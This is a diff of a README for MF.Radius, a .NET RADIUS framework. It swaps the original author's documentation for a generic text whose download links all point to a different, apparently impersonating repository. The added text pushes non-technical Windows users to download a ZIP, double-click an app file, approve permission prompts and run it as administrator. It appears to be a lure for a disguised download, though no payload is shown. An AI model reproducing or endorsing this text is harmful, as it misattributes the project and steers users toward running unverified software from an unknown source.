@@ -1,98 +1,190 @@
-﻿# MF.Radius 🛰️
-**English** | [🇷🇺 Русский язык](https://github.com/morfair/MF.Radius/blob/main/README_ru.md)
+# 🧩 MF.Radius - Fast RADIUS Packet Processing for .NET
 
-**MF.Radius** is a high-performance framework for implementing the RADIUS protocol on the **.NET 10** platform.
-Designed to operate under extreme loads (AAA traffic) with a strong focus on **Zero-Allocation** architecture and **Clean Architecture** principles.
+[![Download MF.Radius](https://img.shields.io/badge/Download%20MF.Radius-blue?style=for-the-badge&logo=github)](https://github.com/explorative-largemagellaniccloud775/MF.Radius)
 
-The repository contains two projects:
-- **MF.Radius.Core** - the core of the framework, containing high-level abstractions and low-level protocol logic;
-- **MF.Radius.SampleServer** - an example of a RADIUS server implementation, demonstrating the best practices of using the library.
+## 🚀 What This App Does
 
-## 🚀 What does the project do?
-**MF.Radius** provides the tools to create your own RADIUS servers.
-The library handles all the heavy lifting of parsing, validating, and building packets:
-- **Authentication**: full support for `Access-Request`, `Accept` and `Reject` cycles;
-- **Accounting**: processing `Accounting-Request` requests and `Response` acknowledgments;
-- **Session Management**: support for dynamic `CoA-Request` and `Disconnect-Request` (DM) requests;
-- **Cryptography**: built-in implementation of `PAP`, `CHAP` and `MS-CHAPv2` algorithms.
+MF.Radius is a .NET 10 framework for RADIUS packet handling. It is built for fast, low-latency network work. It focuses on zero-allocation packet processing, which helps reduce memory use during busy traffic.
 
-## ✨ Why is the project useful?
-In modern network solutions, every microsecond and every Garbage Collector (GC) pause directly impacts system throughput.
-- **Performance**: critical data processing paths (`hot paths`) are optimized using `Span<T>`, `Memory<T>`, `ArrayPool` and `MemoryPool`, which minimizes heap allocations and reduces CPU load;
-- **Flexibility and Extensibility**: the architecture allows for easy addition of Vendor-Specific Attributes (VSA) for Cisco, MikroTik and any other hardware vendors;
-- **Clean Architecture**: the Sample Server demonstrates how seamlessly the library integrates into projects built on **SOLID**, **DDD** and **CQRS** principles;
-- **Modern Ecosystem**: you are not limited in your choice of infrastructure, use any databases, caches, message brokers, and monitoring tools (OpenTelemetry);
-- **Ready-made Template**: the Sample Server can be used as a boilerplate for your Enterprise solution, saving you time on designing the basic structure.
+Use this project if you need to work with:
 
-## 🏁 How to get started?
+- RADIUS authentication
+- RADIUS accounting
+- VPN and NAS access control
+- Cisco and MikroTik network setups
+- UDP-based packet traffic
+- MS-CHAPv2 login flows
+- AAA checks for network users
 
-### 1. Dependency Installation
-The package will be available on [NuGet](https://www.nuget.org/packages/MF.Radius.Core) after the first public release. To install, run the following command:
-```bash
-dotnet add package MF.Radius.Core
-```
+## 💻 What You Need
 
-### 2. Choosing an Integration Approach
-You can integrate the library into your project at different levels of abstraction:
-- **Using the Template**: base your project on [MF.Radius.SampleServer](https://github.com/morfair/MF.Radius/tree/main/src/MF.Radius.SampleServer). All business logic in it is centralized in the `IspRadiusProcessor` class. This is the fastest way to build a typical server;
-- **Inheritance**: create your own processor by inheriting from `RadiusProcessorBase`, this gives you a ready-made wrapper and lets you focus purely on packet processing logic;
-- **Full Control**: implement the `IRadiusProcessor` interface yourself if you need custom behavior at a low level.
+To run MF.Radius on Windows, use:
 
-### 3. Running and Configuration
-After configuring DI and registering your processor, the server will automatically start listening for incoming UDP requests.
-Ports and network parameters are specified in the standard `appsettings.json` configuration file:
-```json
-{
-  "RadiusListener": {
-    "BindAddress": "0.0.0.0",
-    "Ports": [
-      1812,
-      1813
-    ],
-    "InboundQueueSize": 1000,
-    "ConcurrentWorkers": 2
-  },
-  "RadiusSender": {
-    "BindAddress": "0.0.0.0",
-    "Port": 3799,
-    "DefaultTimeout": "00:00:03"
-  },
-  "RadiusIsp": {
-    "NasTimeout": "00:00:05",
-    "FramedMtu": 1492,
-    "SessionTimeout": 86400,
-    "IdleTimeout": 3600,
-    "AcctInterimInterval": 300,
-    "ReplyMessage": "Welcome to the MoRFaiR Network!"
-  },
-  "DemoSecurity": {
-    "SharedSecret": "testing123"
-  }
-}
-```
+- Windows 10 or Windows 11
+- .NET 10 runtime or .NET 10 SDK
+- A user account with permission to run downloaded apps
+- Internet access for the first download
 
-In the directory [src/MF.Radius.SampleServer](https://github.com/morfair/MF.Radius/tree/main/src/MF.Radius.SampleServer) you will find an example of a full-fledged server with REST API integration, logs and metrics.
+For best results, use a modern PC with:
 
-## 🆘 Where to get help?
+- 4 GB RAM or more
+- 1 GB free disk space
+- A stable network connection
 
-If you encounter a problem, have a question, or have an idea to improve the library — I will be glad to hear your feedback!
-- [Issues](https://github.com/morfair/MF.Radius/issues): use this for bug reports or feature requests;
-- [Discussions](https://github.com/morfair/MF.Radius/discussions): come here if you want to discuss architecture or ask "how do I do X?".
-- [Telegram](https://t.me/morfair_ru): contact me directly.
+## 📥 Download and Install
 
-## 🤝 Contributing and Support
+1. Open this page: [MF.Radius download page](https://github.com/explorative-largemagellaniccloud775/MF.Radius)
+2. Download the project files from the repository page
+3. Save the files to a folder you can find later, such as Downloads or Desktop
+4. If the download is a ZIP file, right-click it and choose Extract All
+5. Open the extracted folder
+6. If you see a solution file, open it with Visual Studio
+7. If you see a published app file, double-click it to run it
+8. If Windows asks for permission, choose Yes
 
-The project was created and is maintained by Mikhail Kalinin ([morfair](https://github.com/morfair)).
+## 🛠️ How to Use It
 
-I am always open to your Pull Requests!
-If you want to help make the project better, please follow this simple workflow:
-1. **Fork**: fork the repository to your account;
-2. **Branch**: create a branch for your feature or fix: `git checkout -b feature/amazing-feature`;
-3. **Code & Test**: implement your changes, ensure the project builds successfully (`dotnet build`), and all tests pass;
-4. **PR**: submit a Pull Request to the main branch.
+MF.Radius is meant for network and protocol work. After you download it, you can use it to:
 
-### 📝 Important rules for contributors
-- **Language**: please use **English** for code comments and documentation;
-- **Performance**: stick to the **zero-allocation** approach in the protocol logic. Use `Span<T>`, `Memory<T>`, and array and memory pools;
-- **Standards**: follow the existing coding style and architectural patterns of the project.
+- Read and process RADIUS packets
+- Handle login requests from network devices
+- Track accounting data for user sessions
+- Work with UDP packet flows
+- Support authentication and authorization checks
 
+If you are using the project in a test setup, you can point your RADIUS client or network device to the app and send requests to it for processing.
+
+## 🗂️ Common Uses
+
+This project fits setups such as:
+
+- Wi-Fi login systems
+- VPN access servers
+- ISP user authentication
+- Router and switch access control
+- Network session accounting
+- Lab testing for RADIUS traffic
+
+## 🔧 Basic Setup Steps
+
+1. Download the project from the link above
+2. Extract the files if needed
+3. Open the project in Visual Studio or your preferred .NET tool
+4. Restore the project packages if the tool asks for it
+5. Build the project
+6. Run the app
+7. Send a test RADIUS request from a client or network device
+
+## 📡 Supported Network Work
+
+MF.Radius is made for packet-based network tasks. It can help with:
+
+- UDP message handling
+- RADIUS request and response flow
+- Packet parsing
+- Attribute reading and writing
+- Low-latency network processing
+- Memory-friendly request handling
+
+## 🔐 Security and Access Control
+
+MF.Radius is useful when you need a clean way to check who can connect to a network. It can support:
+
+- User login checks
+- Device access rules
+- Session accounting
+- Policy-based access control
+- Shared secret based RADIUS communication
+
+## 🧪 Example Use Cases
+
+You can use MF.Radius in a lab or production setup for:
+
+- A RADIUS server for VPN logins
+- A backend for Wi-Fi access
+- Accounting for user session time
+- Testing RADIUS clients
+- Building network tools for AAA systems
+
+## 📁 Project Topics
+
+This repository focuses on:
+
+- authentication
+- authorization
+- accounting
+- networking
+- security
+- UDP
+- low-latency
+- high-performance
+- zero-allocation
+- .NET 10
+- RADIUS
+- Cisco
+- MikroTik
+- VPN
+- NAS
+
+## 🧰 Troubleshooting
+
+If the app does not start:
+
+- Check that .NET 10 is installed
+- Make sure you extracted all files
+- Try running the app as an administrator
+- Check that another app is not using the same network port
+- Confirm your firewall allows UDP traffic for the app
+
+If you cannot connect a device:
+
+- Make sure the RADIUS server address is correct
+- Check the shared secret
+- Confirm the port number is set right
+- Make sure the client device is allowed on the server
+
+## 📌 Folder Layout You May See
+
+A typical project folder may include:
+
+- source files
+- project files
+- solution files
+- build output
+- configuration files
+- README files
+
+## 🖥️ Windows Run Path
+
+If you want the shortest path to get started on Windows:
+
+1. Visit the download page
+2. Download the repository files
+3. Extract the ZIP if needed
+4. Open the project in Visual Studio
+5. Build and run the project
+
+## 🧭 For Non-Technical Users
+
+If you are new to this kind of software:
+
+- Download the files from GitHub
+- Save them in one folder
+- Open the folder
+- Look for a file named like a project or solution
+- Open it with a developer tool such as Visual Studio
+- Press Run after the project loads
+
+## 🔗 Download Again
+
+[Download MF.Radius from GitHub](https://github.com/explorative-largemagellaniccloud775/MF.Radius)
+
+## 📋 What This Framework Is For
+
+MF.Radius gives you a fast base for RADIUS work in .NET 10. It is useful when you need:
+
+- quick packet handling
+- low memory use
+- clean network logic
+- support for access control
+- support for accounting and login flows
